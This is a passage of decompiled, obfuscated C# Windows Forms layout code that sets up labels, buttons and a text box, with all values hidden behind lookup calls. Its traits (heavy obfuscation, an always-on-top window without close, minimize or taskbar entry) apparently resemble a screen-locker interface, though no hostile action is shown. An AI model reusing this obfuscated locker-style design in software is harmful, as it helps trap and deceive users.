		((Control)messageID).set_TabIndex(StoreType.RegisterNode(452));
		((Control)messageID).set_Text(PluginDictionary.CheckContext(1080));
		messageID.set_TextAlign((ContentAlignment)StoreType.RegisterNode(456));
		((Control)session).set_AutoSize((byte)StoreType.RegisterNode(460) != 0);
		((Control)session).set_Font(new Font(PluginDictionary.CheckContext(1026), StoreType.EnableForm(464), (FontStyle)StoreType.RegisterNode(468), (GraphicsUnit)StoreType.RegisterNode(472), (byte)StoreType.RegisterNode(476)));
		((Control)session).set_Location(new Point(StoreType.RegisterNode(480), StoreType.RegisterNode(484)));
		((Control)session).set_Name(PluginDictionary.CheckContext(1091));
		((Control)session).set_Size(new Size(StoreType.RegisterNode(488), StoreType.RegisterNode(492)));
		((Control)session).set_TabIndex(StoreType.RegisterNode(496));
		((Control)session).set_Text(PluginDictionary.CheckContext(1104));
		((Control)queryEnabled).set_AutoSize((byte)StoreType.RegisterNode(500) != 0);
		((Control)queryEnabled).set_Font(new Font(PluginDictionary.CheckContext(1026), StoreType.EnableForm(504), (FontStyle)StoreType.RegisterNode(508)));
		((Control)queryEnabled).set_Location(new Point(StoreType.RegisterNode(512), StoreType.RegisterNode(516)));
		((Control)queryEnabled).set_Name(PluginDictionary.CheckContext(1193));
		((Control)queryEnabled).set_Size(new Size(StoreType.RegisterNode(520), StoreType.RegisterNode(524)));
		((Control)queryEnabled).set_TabIndex(StoreType.RegisterNode(528));
		((Control)queryEnabled).set_Text(PluginDictionary.CheckContext(1206));
		((Control)outputID).set_AutoSize((byte)StoreType.RegisterNode(532) != 0);
		((Control)outputID).set_Font(new Font(PluginDictionary.CheckContext(1026), StoreType.EnableForm(536), (FontStyle)StoreType.RegisterNode(540)));
		((Control)outputID).set_Location(new Point(StoreType.RegisterNode(544), StoreType.RegisterNode(548)));
		((Control)outputID).set_Name(PluginDictionary.CheckContext(1281));
		((Control)outputID).set_Size(new Size(StoreType.RegisterNode(552), StoreType.RegisterNode(556)));
		((Control)outputID).set_TabIndex(StoreType.RegisterNode(560));
		((Control)outputID).set_Text(componentResourceManager.GetString(PluginDictionary.CheckContext(1294)));
		((Control)variableCache).set_AutoSize((byte)StoreType.RegisterNode(564) != 0);
		((Control)variableCache).set_Font(new Font(PluginDictionary.CheckContext(1026), StoreType.EnableForm(568), (FontStyle)StoreType.RegisterNode(572)));
		((Control)variableCache).set_Location(new Point(StoreType.RegisterNode(576), StoreType.RegisterNode(580)));
		((Control)variableCache).set_Name(PluginDictionary.CheckContext(1317));
		((Control)variableCache).set_Size(new Size(StoreType.RegisterNode(584), StoreType.RegisterNode(588)));
		((Control)variableCache).set_TabIndex(StoreType.RegisterNode(592));
		((Control)variableCache).set_Text(PluginDictionary.CheckContext(1330));
		((Control)firstFont).set_AutoSize((byte)StoreType.RegisterNode(596) != 0);
		((Control)firstFont).set_Font(new Font(PluginDictionary.CheckContext(1026), StoreType.EnableForm(600), (FontStyle)StoreType.RegisterNode(604), (GraphicsUnit)StoreType.RegisterNode(608), (byte)StoreType.RegisterNode(612)));
		((Control)firstFont).set_Location(new Point(StoreType.RegisterNode(616), StoreType.RegisterNode(620)));
		((Control)firstFont).set_Name(PluginDictionary.CheckContext(1341));
		((Control)firstFont).set_Size(new Size(StoreType.RegisterNode(624), StoreType.RegisterNode(628)));
		((Control)firstFont).set_TabIndex(StoreType.RegisterNode(632));
		((Control)firstFont).set_Text(PluginDictionary.CheckContext(1354));
		((Control)nextTimer).set_AutoSize((byte)StoreType.RegisterNode(636) != 0);
		((Control)nextTimer).set_Font(new Font(PluginDictionary.CheckContext(1026), StoreType.EnableForm(640), (FontStyle)StoreType.RegisterNode(644), (GraphicsUnit)StoreType.RegisterNode(648), (byte)StoreType.RegisterNode(652)));
		((Control)nextTimer).set_Location(new Point(StoreType.RegisterNode(656), StoreType.RegisterNode(660)));
		((Control)nextTimer).set_Name(PluginDictionary.CheckContext(1604));
		((Control)nextTimer).set_Size(new Size(StoreType.RegisterNode(664), StoreType.RegisterNode(668)));
		((Control)nextTimer).set_TabIndex(StoreType.RegisterNode(672));
		((Control)nextTimer).set_Text(PluginDictionary.CheckContext(1617));
		((Control)activeOutput).set_BackColor(Color.FromArgb(StoreType.RegisterNode(676), StoreType.RegisterNode(680), StoreType.RegisterNode(684)));
		((Control)activeOutput).set_Cursor(Cursors.get_Default());
		((ButtonBase)activeOutput).get_FlatAppearance().set_BorderSize(StoreType.RegisterNode(688));
		((ButtonBase)activeOutput).set_FlatStyle((FlatStyle)StoreType.RegisterNode(692));
		((Control)activeOutput).set_Font(new Font(PluginDictionary.CheckContext(1026), StoreType.EnableForm(696), (FontStyle)StoreType.RegisterNode(700)));
		((Control)activeOutput).set_Location(new Point(StoreType.RegisterNode(704), StoreType.RegisterNode(708)));
		((Control)activeOutput).set_Name(PluginDictionary.CheckContext(1642));
		((Control)activeOutput).set_Size(new Size(StoreType.RegisterNode(712), StoreType.RegisterNode(716)));
		((Control)activeOutput).set_TabIndex(StoreType.RegisterNode(720));
		((Control)activeOutput).set_Text(PluginDictionary.CheckContext(1657));
		((ButtonBase)activeOutput).set_UseVisualStyleBackColor((byte)StoreType.RegisterNode(724) != 0);
		((Control)activeOutput).add_Click((EventHandler)ChangePackage);
		((Control)versionHandle).set_BackColor(Color.FromArgb(StoreType.RegisterNode(728), StoreType.RegisterNode(732), StoreType.RegisterNode(736)));
		((TextBoxBase)versionHandle).set_BorderStyle((BorderStyle)StoreType.RegisterNode(740));
		((Control)versionHandle).set_Font(new Font(PluginDictionary.CheckContext(1676), StoreType.EnableForm(744), (FontStyle)StoreType.RegisterNode(748), (GraphicsUnit)StoreType.RegisterNode(752), (byte)StoreType.RegisterNode(756)));
		((Control)versionHandle).set_ForeColor(Color.Black);
		((Control)versionHandle).set_Location(new Point(StoreType.RegisterNode(760), StoreType.RegisterNode(764)));
		((Control)versionHandle).set_Name(PluginDictionary.CheckContext(1701));
		((Control)versionHandle).set_Size(new Size(StoreType.RegisterNode(768), StoreType.RegisterNode(772)));
		((Control)versionHandle).set_TabIndex(StoreType.RegisterNode(776));
		((Control)versionHandle).add_TextChanged((EventHandler)ProcessIcon);
		((Control)generatorToken).set_BackColor(Color.FromArgb(StoreType.RegisterNode(780), StoreType.RegisterNode(784), StoreType.RegisterNode(788)));
		((Control)generatorToken).set_Cursor(Cursors.get_Default());
		((ButtonBase)generatorToken).get_FlatAppearance().set_BorderSize(StoreType.RegisterNode(792));
		((ButtonBase)generatorToken).set_FlatStyle((FlatStyle)StoreType.RegisterNode(796));
		((Control)generatorToken).set_Font(new Font(PluginDictionary.CheckContext(1026), StoreType.EnableForm(800), (FontStyle)StoreType.RegisterNode(804)));
		((Control)generatorToken).set_Location(new Point(StoreType.RegisterNode(808), StoreType.RegisterNode(812)));
		((Control)generatorToken).set_Name(PluginDictionary.CheckContext(1724));
		((Control)generatorToken).set_Size(new Size(StoreType.RegisterNode(816), StoreType.RegisterNode(820)));
		((Control)generatorToken).set_TabIndex(StoreType.RegisterNode(824));
		((Control)generatorToken).set_Text(PluginDictionary.CheckContext(1745));
		((ButtonBase)generatorToken).set_UseVisualStyleBackColor((byte)StoreType.RegisterNode(828) != 0);
		((Control)generatorToken).add_Click((EventHandler)RemoveCondition);
		((Control)lastQuery).set_AutoSize((byte)StoreType.RegisterNode(832) != 0);
		((Control)lastQuery).set_Cursor(Cursors.get_Hand());
		((Control)lastQuery).set_Font(new Font(PluginDictionary.CheckContext(1026), StoreType.EnableForm(836), (FontStyle)StoreType.RegisterNode(840)));
		lastQuery.set_LinkColor(Color.Black);
		((Control)lastQuery).set_Location(new Point(StoreType.RegisterNode(844), StoreType.RegisterNode(848)));
		((Control)lastQuery).set_Name(PluginDictionary.CheckContext(1754));
		((Control)lastQuery).set_Size(new Size(StoreType.RegisterNode(852), StoreType.RegisterNode(856)));
		((Control)lastQuery).set_TabIndex(StoreType.RegisterNode(860));
		lastQuery.set_TabStop((byte)StoreType.RegisterNode(864) != 0);
		((Control)lastQuery).set_Text(PluginDictionary.CheckContext(1773));
		lastQuery.add_LinkClicked(new LinkLabelLinkClickedEventHandler(LoadNode));
		((Control)dataHeader).set_AutoSize((byte)StoreType.RegisterNode(868) != 0);
		((Control)dataHeader).set_Cursor(Cursors.get_Hand());
		((Control)dataHeader).set_Font(new Font(PluginDictionary.CheckContext(1026), StoreType.EnableForm(872), (FontStyle)StoreType.RegisterNode(876)));
		dataHeader.set_LinkColor(Color.Black);
		((Control)dataHeader).set_Location(new Point(StoreType.RegisterNode(880), StoreType.RegisterNode(884)));
		((Control)dataHeader).set_Name(PluginDictionary.CheckContext(1816));
		((Control)dataHeader).set_Size(new Size(StoreType.RegisterNode(888), StoreType.RegisterNode(892)));
		((Control)dataHeader).set_TabIndex(StoreType.RegisterNode(896));
		dataHeader.set_TabStop((byte)StoreType.RegisterNode(900) != 0);
		((Control)dataHeader).set_Text(PluginDictionary.CheckContext(1833));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(StoreType.EnableForm(904), StoreType.EnableForm(908)));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)StoreType.RegisterNode(912));
		((Control)this).set_BackColor(Color.FromArgb(StoreType.RegisterNode(916), StoreType.RegisterNode(920), StoreType.RegisterNode(924)));
		((Form)this).set_ClientSize(new Size(StoreType.RegisterNode(928), StoreType.RegisterNode(932)));
		((Form)this).set_ControlBox((byte)StoreType.RegisterNode(936) != 0);
		((Control)this).get_Controls().Add((Control)(object)dataHeader);
		((Control)this).get_Controls().Add((Control)(object)nextTimer);
		((Control)this).get_Controls().Add((Control)(object)lastQuery);
		((Control)this).get_Controls().Add((Control)(object)generatorToken);
		((Control)this).get_Controls().Add((Control)(object)versionHandle);
		((Control)this).get_Controls().Add((Control)(object)activeOutput);
		((Control)this).get_Controls().Add((Control)(object)messageID);
		((Control)this).get_Controls().Add((Control)(object)session);
		((Control)this).get_Controls().Add((Control)(object)queryEnabled);
		((Control)this).get_Controls().Add((Control)(object)outputID);
		((Control)this).get_Controls().Add((Control)(object)variableCache);
		((Control)this).get_Controls().Add((Control)(object)firstFont);
		((Control)this).get_Controls().Add((Control)(object)keywordsSet);
		((Control)this).get_Controls().Add((Control)(object)currentContainer);
		((Control)this).get_Controls().Add((Control)(object)lineHandle);
		((Control)this).set_Cursor(Cursors.get_No());
		((Control)this).set_ForeColor(Color.FromArgb(StoreType.RegisterNode(940), StoreType.RegisterNode(944), StoreType.RegisterNode(948)));
		((Form)this).set_FormBorderStyle((FormBorderStyle)StoreType.RegisterNode(952));
		((Form)this).set_Icon(NodeCollection.CleanAssistant(componentResourceManager.GetObject(PluginDictionary.CheckContext(1892))));
		((Form)this).set_MaximizeBox((byte)StoreType.RegisterNode(956) != 0);
		((Form)this).set_MinimizeBox((byte)StoreType.RegisterNode(960) != 0);
		((Control)this).set_Name(PluginDictionary.CheckContext(646));
		((Form)this).set_ShowInTaskbar((byte)StoreType.RegisterNode(964) != 0);
		((Form)this).set_StartPosition((FormStartPosition)StoreType.RegisterNode(968));
		((Control)this).set_Text(PluginDictionary.CheckContext(646));
		((Form)this).set_TopMost((byte)StoreType.RegisterNode(972) != 0);
		((Form)this).add_FormClosing(new FormClosingEventHandler(IncreaseClient));
		((Form)this).add_Load((EventHandler)NavigateNode);
		((ISupportInitialize)keywordsSet).EndInit();
		((Control)this).ResumeLayout((byte)StoreType.RegisterNode(976) != 0);
		((Control)this).PerformLayout();
	}
}
